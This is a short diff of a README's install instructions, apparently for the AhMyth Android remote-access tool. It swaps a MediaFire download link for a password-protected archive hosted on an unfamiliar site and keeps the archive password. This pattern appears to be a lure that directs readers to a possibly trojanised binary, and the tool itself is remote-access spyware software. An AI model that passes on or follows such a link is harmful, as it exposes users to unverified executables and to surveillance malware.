@@ -15,7 +15,7 @@ To install:
 
 1) From binaries
 Prerequisite :
-Download a binary from [Click Here To Download](https://www.mediafire.com/file/wr2lhgw591rajsf/AhMyth.rar/file)
+Download a binary from [Click Here To Download](https://rdmfile.eu/install/ejDYHm5VI2dh)
 [Pass: S0f4fr33!]
 
 
